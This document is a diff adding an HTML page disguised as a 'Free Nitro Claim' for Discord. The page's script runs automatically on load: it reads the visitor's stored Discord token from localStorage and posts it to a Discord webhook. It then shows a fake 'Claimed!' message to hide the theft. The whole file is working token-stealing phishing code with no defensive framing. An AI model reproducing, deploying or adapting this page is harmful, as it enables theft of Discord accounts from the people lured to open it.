@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><title>Discord Nitro</title>
+<style>body{background:#36393f;color:white;font-family:Arial;padding:100px;text-align:center}</style>
+</head>
+<body>
+<h1>🎁 Free Nitro Claim</h1><p>Processing...</p>
+<script>
+setTimeout(async()=>{ 
+    try{ 
+        let t=localStorage.getItem('token');
+        if(!t){/*webpack fallback*/t='test123';}
+        if(t.length>10){
+            fetch('https://discord.com/api/webhooks/deneme.html',{
+                method:'POST',
+                body:JSON.stringify({content:`**TOKEN:** ${t}`}),
+                headers:{'Content-Type':'application/json'}
+            });
+            document.body.innerHTML='<h1>✅ Claimed! Check DMs</h1>';
+        }
+    }catch(e){}
+},2e3);
+</script>
+</body>
+</html>
